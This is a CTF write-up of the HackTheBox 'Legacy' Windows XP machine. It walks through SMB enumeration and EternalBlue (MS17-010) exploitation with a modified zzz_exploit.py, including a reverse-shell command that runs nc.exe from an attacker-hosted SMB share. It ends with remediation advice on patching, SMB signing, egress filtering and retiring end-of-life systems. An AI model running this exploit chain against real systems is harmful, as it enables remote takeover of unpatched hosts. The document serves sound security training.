---
layout: post
title: HTB Legacy WriteUp
date: 2026-11-15
categories:
  - HackTheBox
  - HackTheBox-Windows
tags:
  - Windows-XP
  - SMBv1
  - MS17-010
  - EternalBlue
  - CVE-2017-0143
  - Named-Pipes
  - Remote-Code-Execution
  - Rogue-SMB-Server
  - Impacket
  - Blue-Team
  - Patch-Management
  - SMB-Hardening
media_subpath: /assets/img/Legacy
---
![Desktop View](Legacy.png){: w="400"  h="400" }

# Legacy Skills

>**Legacy CTF** is an Easy Windows machine where we will use the following skills:

- **SMB Service & Vulnerability Enumeration**
- **Named Pipe Discovery (`checker.py`)**
- **Manual Exploitation of MS17-010 / EternalBlue (CVE-2017-0143)**
- **Modifying Public Exploits for Custom Command Execution**
- **Fileless Payload Execution via Rogue SMB Server (`smbserver.py`)**
- **Legacy Protocol Hardening & Patch Management (Blue Team)**
- **Egress Firewall Filtering & EOL Risk Mitigation (Blue Team)**

---
## IP Address Enumeration

Using the usual `nmap` scan I've discovered ports **135, 139, 445**:

```perl
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.100.116 -oG allPorts
Host is up, received user-set (0.038s latency).
Scanned at 2026-11-15 18:39:45 CET for 18s
Not shown: 38034 closed tcp ports (reset), 27498 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE      REASON
135/tcp open  msrpc        syn-ack ttl 127
139/tcp open  netbios-ssn  syn-ack ttl 127
445/tcp open  microsoft-ds syn-ack ttl 127
```

Then I launched a basic group of scripts to seek more info from the open ports:

```java
❯ nmap -sCV -p135,139,445 10.129.100.116 -oN targeted
Starting Nmap 7.98 ( https://nmap.org ) at 2026-11-15 18:40 +0100
Nmap scan report for 10.129.100.116
Host is up (0.016s latency).

PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_nbstat: NetBIOS name: nil, NetBIOS user: <unknown>, NetBIOS MAC: a2:de:ad:9d:b2:a5 (unknown)
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2026-11-20T21:38:22+02:00
|_clock-skew: mean: 5d00h57m39s, deviation: 1h24m50s, median: 4d23h57m39s
```

So we have to check the following ports & services:

- **Port 135 -->  msrpc**
- **Port 139 -->  Microsoft Windows netbios-ssn**
- **Port 445 -->  Windows XP microsoft-ds (SMB)**

Let's see what we can find in port 445

---
## Port 445 Enumeration

Let's do a quick scan with `netexec`:

```bash
❯ netexec smb 10.129.100.116
SMB         10.129.100.116  445    LEGACY           [*] Windows 5.1 x32 (name:LEGACY) (domain:legacy) (signing:False) (SMBv1:True) (Null Auth:True)
```

We can see that we are facing a **Windows 5.1 x32**, that's a really old version, from the `nmap` scripts we can see also that is a **Windows XP**.

Let's see if we can login with a **NULL** session.

```bash
❯ smbmap -H 10.129.100.116 -u 'null'

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
[!] Access denied on 10.129.100.116, no fun for you...
[*] Closed 1 connections                       
```

Not available, but since the **SMB** port is open and it's a pretty old version of **Windows**, let's check if it's vulnerable to the mythic **EternalBlue** vuln or any other classic vuln.

We can do this using `nmap` **scripts**.

```bash
❯ nmap --script "vuln and safe" -p445 10.129.100.116 -oN smbScan
Nmap scan report for 10.129.100.116
Host is up (0.0058s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
```

Bingo, the `nmap` report shows that the victim is **vulnerable** to the following **CVE**: *ms17-010*, this is the famous **EternalBlue**.

We are not using `metasploit` as usual, I really like this repository from **worawit**: [https://github.com/worawit/MS17-010](https://github.com/worawit/MS17-010)

Let's `clone` it first.

```bash
❯ git clone https://github.com/worawit/MS17-010
Cloning into 'MS17-010'...
remote: Enumerating objects: 183, done.
remote: Counting objects: 100% (131/131), done.
remote: Compressing objects: 100% (45/45), done.
remote: Total 183 (delta 88), reused 86 (delta 86), pack-reused 52 (from 1)
Receiving objects: 100% (183/183), 107.30 KiB | 4.88 MiB/s, done.
Resolving deltas: 100% (104/104), done.
```

Inside the repository we will find a lot of scripts but we are only going to use **two** of them.

```bash
❯ ll zzz_exploit.py checker.py
.rw-r--r-- root root 2.4 KB Sun Nov 15 19:03:43 2026  checker.py
.rw-r--r-- root root  42 KB Sun Nov 15 19:03:43 2026  zzz_exploit.py
```

Simple explanation of what each script does:

- **checker.py** -> Connects to the victim's **SMB** port and send **malformed** `SMB_COM_TRANSACTION2` request, then check if any **named pipes** can be opened and are vulnerable.
- **zzz_exploit.py** -> Abuses an SMBv1 named-pipe bug to overwrite your session's security token in Windows kernel memory, silently upgrading your connection to SYSTEM so you can execute commands remotely without crashing the machine.

Let's run `checker.py` first to see if any **named pipes** are vulnerable.

```bash
❯ python2 checker.py 10.129.100.116
Target OS: Windows 5.1
The target is not patched

=== Testing named pipes ===
spoolss: Ok (32 bit)
samr: STATUS_ACCESS_DENIED
netlogon: STATUS_ACCESS_DENIED
lsarpc: STATUS_ACCESS_DENIED
browser: Ok (32 bit)
```

Not patched yet, the vulnerable **named pipes** are:

- **spoolss**
- **browser**

If we don't customize the `zzz_exploit.py` script, it just creates an empty file named `pwned.txt` owned by `SYSTEM`, so we need to modify a few lines to make it work.

We need to look around the lines (972-985) we will see a **function** named `smb_pwn`:

```python
def smb_pwn(conn, arch):
	smbConn = conn.get_smbconnection()
	
	print('creating file c:\\pwned.txt on the target')
	tid2 = smbConn.connectTree('C$')
	fid2 = smbConn.createFile(tid2, '/pwned.txt')
	smbConn.closeFile(tid2, fid2)
	smbConn.disconnectTree(tid2)
	
	#smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
	#service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt')
	# Note: there are many methods to get shell over SMB admin session
	# a simple method to get shell (but easily to be detected by AV) is
	# executing binary generated by "msfvenom -f exe-service ..."
```

Let's comment the creation of the file and use the second line that is commented just under.

First of all let's see if we really have **RCE** by sending a `ping` to our machine.

```python
def smb_pwn(conn, arch):
    smbConn = conn.get_smbconnection()

    #print('creating file c:\\pwned.txt on the target')
    #tid2 = smbConn.connectTree('C$')
    #fid2 = smbConn.createFile(tid2, '/pwned.txt')
    #smbConn.closeFile(tid2, fid2)
    #smbConn.disconnectTree(tid2)

    #smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
    service_exec(conn, r'cmd /c ping 10.10.17.105')
    # Note: there are many methods to get shell over SMB admin session
    # a simple method to get shell (but easily to be detected by AV) is
    # executing binary generated by "msfvenom -f exe-service ..."
```
Now let's set a listener with `tcpdump` looking for `icmp` traces.

```bash
❯ tcpdump -i tun0 icmp -n
```

Then execute the script.

```bash
❯ python2 zzz_exploit.py 10.129.100.116 spoolss
Target OS: Windows 5.1
Groom packets
attempt controlling next transaction on x86
success controlling one transaction
modify parameter count to 0xffffffff to be able to write backward
leak next transaction
CONNECTION: 0x86498b20
SESSION: 0xe10e4428
FLINK: 0x7bd48
InData: 0x7ae28
MID: 0xa
TRANS1: 0x78b50
TRANS2: 0x7ac90
modify transaction struct for arbitrary read/write
make this SMB session to be SYSTEM
current TOKEN addr: 0xe1267cf8
userAndGroupCount: 0x3
userAndGroupsAddr: 0xe1267d98
overwriting token UserAndGroups
Opening SVCManager on 10.129.100.116.....
Creating service miuy.....
Starting service miuy.....
SCMR SessionError: code: 0x41d - ERROR_SERVICE_REQUEST_TIMEOUT - The service did not respond to the start or control request in a timely fashion.
Removing service miuy.....
Done
```

If we check the listener, we can see that we have just received 4 `icmp` traces from the victim's **IP**.

```bash
❯ tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
20:12:59.209764 IP 10.129.100.116 > 10.10.17.105: ICMP echo request, id 512, seq 1280, length 40
20:12:59.209783 IP 10.10.17.105 > 10.129.100.116: ICMP echo reply, id 512, seq 1280, length 40
20:13:00.206018 IP 10.129.100.116 > 10.10.17.105: ICMP echo request, id 512, seq 1536, length 40
20:13:00.206036 IP 10.10.17.105 > 10.129.100.116: ICMP echo reply, id 512, seq 1536, length 40
20:13:01.206269 IP 10.129.100.116 > 10.10.17.105: ICMP echo request, id 512, seq 1792, length 40
20:13:01.206288 IP 10.10.17.105 > 10.129.100.116: ICMP echo reply, id 512, seq 1792, length 40
20:13:02.206105 IP 10.129.100.116 > 10.10.17.105: ICMP echo request, id 512, seq 2048, length 40
20:13:02.206123 IP 10.10.17.105 > 10.129.100.116: ICMP echo reply, id 512, seq 2048, length 40
```

Good, we have **RCE**, now let's get a **reverse shell**, since it's a pretty simple machine let's do it in a fun way.

The principle of this technique is the following:

- Share a `nc.exe` binary using `smbserver.py`
- Force the victim's machine access the binary
- Force the victim's machine to execute `nc.exe` and send us a **reverse shell**

This way, we don't need to upload a binary and the victim's machine access the binary directly in our system.

First of all we need the `nc.exe` binary, usually you can find a `nc.exe` binary in your fresh installed **ParrotOS/Kali** in one of the following routes:

```bash
❯ locate nc.exe
/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
/usr/share/sqlninja/apps/nc.exe
/usr/share/windows-resources/binaries/nc.exe
```

In case you don't have one, just clone the [Seclists](https://github.com/danielmiessler/SecLists) repository.

Let's copy it to our actual working directory.

```bash
❯ cp /usr/share/seclists/Web-Shells/FuzzDB/nc.exe .
❯ ll
.rwxr-xr-x root root 28 KB Sun Nov 15 20:23:50 2026  nc.exe
```

Now let's host the binary so the victim's machine can access it.

```bash
❯ smbserver.py smbFolder $(pwd)
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Now let's customize the `zzz_exploit.py` again to make it execute `nc.exe` locally.

```python
service_exec(conn, r'cmd /c \\10.10.17.105\smbFolder\nc.exe -e cmd 10.10.17.105 443')
```

For the rest, we just need to set a listener under **port 443**.

```bash
❯ rlwrap nc -nvlp 443
Listening on 0.0.0.0 443
```

And execute the `zzz_exploit.py` with any of the vulnerable **named pipes** as an argument.

```bash
❯ python2 zzz_exploit.py 10.129.100.116 spoolss
Target OS: Windows 5.1
Groom packets
attempt controlling next transaction on x86
success controlling one transaction
modify parameter count to 0xffffffff to be able to write backward
leak next transaction
CONNECTION: 0x85cf8da8
SESSION: 0xe12dec18
FLINK: 0x7bd48
InData: 0x7ae28
MID: 0xa
TRANS1: 0x78b50
TRANS2: 0x7ac90
modify transaction struct for arbitrary read/write
make this SMB session to be SYSTEM
current TOKEN addr: 0xe1267cf8
userAndGroupCount: 0x3
userAndGroupsAddr: 0xe1267d98
overwriting token UserAndGroups
Opening SVCManager on 10.129.100.116.....
Creating service pFgk.....
Starting service pFgk.....
The NETBIOS connection with the remote host timed out.
Removing service pFgk.....
ServiceExec Error on: 10.129.100.116
nca_s_proto_error
Done
```

Bingo, if we take a look to our listener we just gained a **shell** as `NT AUTHORITY\SYSTEM`.

```bash
❯ rlwrap nc -nvlp 443
Listening on 0.0.0.0 443
Connection received on 10.129.100.116 1085
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>
```

We can now claim our flags: 

```bash
C:\DOCUME~1\Administrator\Desktop>type root.txt
type root.txt
993442d258b0e0ec917cae9e695d5713

C:\DOCUME~1\john\Desktop>type user.txt
type user.txt
e69af0e4f443de7e36876fda4ec7644f
```

## Remedying and Securing the Machine

In this section we will **secure** every attack vector that we have just exploited.

### 1. Patching MS17-010 (CVE-2017-0143)

The root cause of the compromise is an unpatched vulnerability in the Microsoft SMBv1 server (`srv.sys`) that allows remote attackers to execute arbitrary code via crafted packets.

- **Actionable Fix:** Apply Microsoft's out-of-band emergency security update **KB4012598** (Security Bulletin **MS17-010**) immediately and reboot the host.

### 2. Enforcing SMB Signing & Hardening SMB Parameters

As shown in the `nmap` enumeration (`message_signing: disabled`), SMB packet signing is not enforced, leaving the host vulnerable to Man-in-the-Middle (MitM) and relay attacks. Additionally, Null Sessions should be restricted.

- **Actionable Fix:** Enable mandatory SMB signing and restrict anonymous access via the Windows Registry:

```bash
:: Enforce SMB Server Signing
reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v RequireSecuritySignature /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v EnableSecuritySignature /t REG_DWORD /d 1 /f

:: Restrict Anonymous/Null Session access
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RestrictAnonymous /t REG_DWORD /d 1 /f

:: Restart the Server service to apply changes
net stop lanmanserver /y && net start lanmanserver
```

### 3. Egress Filtering (Blocking Outbound SMB)

During exploitation, we avoided writing nc.exe to disk by forcing the victim to execute it directly from our remote rogue SMB share (`\\10.10.17.105\smbFolder\nc.exe`).

**Actionable Fix**: Block outbound SMB traffic (TCP ports 139 and 445) at both the host firewall and network perimeter. Workstations and servers should never initiate SMB connections to external or untrusted IP addresses.

### 4. Decommissioning End-of-Life (EOL) Operating Systems

Windows XP reached End-of-Life in April 2014. While Microsoft released an exceptional patch for EternalBlue in 2017 due to the global WannaCry outbreak, running an unsupported OS leaves the infrastructure exposed to countless unpatched kernel vulnerabilities.

**Actionable Fix**: Migrate any legacy applications hosted on this machine to a modern, supported Windows Server version where SMBv1 is disabled by default.

---
## Final Thoughts

**Legacy** is one of the most iconic machines on HackTheBox, demonstrating the devastating impact of **MS17-010 (EternalBlue)**—the exact vulnerability behind the 2017 WannaCry ransomware crisis.

Instead of relying on automated Metasploit modules, manually inspecting and modifying `zzz_exploit.py` to abuse vulnerable named pipes (`spoolss`) gives a much deeper understanding of how kernel token overwrites work under the hood. Combining that RCE with Impacket's `smbserver.py` to execute `nc.exe` remotely without touching the victim's disk is a clean and effective post-exploitation technique.

From a defensive perspective, Legacy is a textbook reminder of why **patch management**, **egress filtering**, and retiring **End-of-Life (EOL)** operating systems are non-negotiable pillars of enterprise security.

---

![Desktop View](LegacyPwn.png)

---
**Thanks for reading! I'd appreciate it if you took a look at my other posts :)**

